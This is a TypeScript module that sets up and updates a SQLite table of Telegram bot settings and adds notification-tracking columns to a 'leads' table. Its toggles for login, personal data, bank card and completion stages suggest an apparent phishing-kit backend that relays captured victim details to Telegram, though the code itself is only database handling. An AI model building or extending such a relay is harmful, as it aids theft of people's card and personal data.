import SQLiteDatabase from 'better-sqlite3';

export function initTelegramSettingsTable(db: ReturnType<typeof SQLiteDatabase>): void {
  try {
    // Create telegram_settings table
    db.exec(`
      CREATE TABLE IF NOT EXISTS telegram_settings (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_token TEXT NOT NULL,
        chat_id TEXT NOT NULL,
        admin_chat_id TEXT,
        notifications_enabled BOOLEAN DEFAULT 1,
        notify_on_login BOOLEAN DEFAULT 1,
        notify_on_personal_data BOOLEAN DEFAULT 1,
        notify_on_bank_card BOOLEAN DEFAULT 1,
        notify_on_completion BOOLEAN DEFAULT 1,
        message_template TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    // Create trigger to update updated_at timestamp
    db.exec(`
      CREATE TRIGGER IF NOT EXISTS update_telegram_settings_updated_at
      AFTER UPDATE ON telegram_settings
      FOR EACH ROW
      BEGIN
        UPDATE telegram_settings SET updated_at = CURRENT_TIMESTAMP WHERE id = NEW.id;
      END
    `);

    console.log('✅ Telegram settings table initialized successfully');
  } catch (error) {
    console.error('❌ Error creating telegram_settings table:', error);
    throw error;
  }
}

/**
 * Insert default Telegram settings
 */
export function insertDefaultTelegramSettings(db: ReturnType<typeof SQLiteDatabase>): void {
  try {
    // Check if settings already exist
    const existingSettings = db.prepare('SELECT COUNT(*) as count FROM telegram_settings').get() as { count: number };
    
    if (existingSettings.count === 0) {
      // Insert default settings
      db.prepare(`
        INSERT INTO telegram_settings (
          bot_token, chat_id, admin_chat_id, notifications_enabled,
          notify_on_login, notify_on_personal_data, notify_on_bank_card, notify_on_completion,
          message_template
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
      `).run(
        '', // Empty bot token - to be configured by admin
        '', // Empty chat ID - to be configured by admin
        '', // Empty admin chat ID - optional
        1,  // Notifications enabled by default
        1,  // Notify on login by default
        1,  // Notify on personal data by default
        1,  // Notify on bank card by default
        1,  // Notify on completion by default
        null // Default message template - will use built-in formatting
      );
      
      console.log('✅ Default Telegram settings inserted');
    } else {
      console.log('ℹ️ Telegram settings already exist, skipping default insertion');
    }
  } catch (error) {
    console.error('❌ Error inserting default Telegram settings:', error);
    throw error;
  }
}

/**
 * Get Telegram settings
 */
export function getTelegramSettings(db: ReturnType<typeof SQLiteDatabase>) {
  try {
    const settings = db.prepare('SELECT * FROM telegram_settings ORDER BY id DESC LIMIT 1').get();
    return settings || null;
  } catch (error) {
    console.error('❌ Error getting Telegram settings:', error);
    return null;
  }
}

/**
 * Update Telegram settings
 */
export function updateTelegramSettings(
  db: ReturnType<typeof SQLiteDatabase>,
  settings: {
    bot_token?: string;
    chat_id?: string;
    admin_chat_id?: string;
    notifications_enabled?: boolean;
    notify_on_login?: boolean;
    notify_on_personal_data?: boolean;
    notify_on_bank_card?: boolean;
    notify_on_completion?: boolean;
    message_template?: string;
  }
): boolean {
  try {
    // Get existing settings
    const existing = getTelegramSettings(db);
    
    if (existing) {
      // Update existing settings
      const result = db.prepare(`
        UPDATE telegram_settings 
        SET bot_token = ?, chat_id = ?, admin_chat_id = ?, notifications_enabled = ?,
            notify_on_login = ?, notify_on_personal_data = ?, notify_on_bank_card = ?, 
            notify_on_completion = ?, message_template = ?, updated_at = CURRENT_TIMESTAMP
        WHERE id = ?
      `).run(
        settings.bot_token ?? existing.bot_token,
        settings.chat_id ?? existing.chat_id,
        settings.admin_chat_id ?? existing.admin_chat_id,
        settings.notifications_enabled ?? existing.notifications_enabled,
        settings.notify_on_login ?? existing.notify_on_login,
        settings.notify_on_personal_data ?? existing.notify_on_personal_data,
        settings.notify_on_bank_card ?? existing.notify_on_bank_card,
        settings.notify_on_completion ?? existing.notify_on_completion,
        settings.message_template ?? existing.message_template,
        existing.id
      );
      
      return result.changes > 0;
    } else {
      // Insert new settings
      const result = db.prepare(`
        INSERT INTO telegram_settings (
          bot_token, chat_id, admin_chat_id, notifications_enabled,
          notify_on_login, notify_on_personal_data, notify_on_bank_card, notify_on_completion,
          message_template
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
      `).run(
        settings.bot_token || '',
        settings.chat_id || '',
        settings.admin_chat_id || '',
        settings.notifications_enabled ?? 1,
        settings.notify_on_login ?? 1,
        settings.notify_on_personal_data ?? 1,
        settings.notify_on_bank_card ?? 1,
        settings.notify_on_completion ?? 1,
        settings.message_template || null
      );
      
      return result.changes > 0;
    }
  } catch (error) {
    console.error('❌ Error updating Telegram settings:', error);
    return false;
  }
}

/**
 * Add notification tracking fields to leads table
 */
export function addNotificationFieldsToLeads(db: ReturnType<typeof SQLiteDatabase>): void {
  try {
    // Check if columns already exist
    const tableInfo = db.prepare("PRAGMA table_info(leads)").all() as Array<{name: string}>;
    const columnNames = tableInfo.map(col => col.name);
    
    // Add notification_sent column if it doesn't exist
    if (!columnNames.includes('notification_sent')) {
      db.exec('ALTER TABLE leads ADD COLUMN notification_sent BOOLEAN DEFAULT 0');
      console.log('✅ Added notification_sent column to leads table');
    }
    
    // Add notification_sent_at column if it doesn't exist
    if (!columnNames.includes('notification_sent_at')) {
      db.exec('ALTER TABLE leads ADD COLUMN notification_sent_at TIMESTAMP');
      console.log('✅ Added notification_sent_at column to leads table');
    }
    
    // Add notification_error column if it doesn't exist
    if (!columnNames.includes('notification_error')) {
      db.exec('ALTER TABLE leads ADD COLUMN notification_error TEXT');
      console.log('✅ Added notification_error column to leads table');
    }
  } catch (error) {
    console.error('❌ Error adding notification fields to leads table:', error);
    throw error;
  }
}
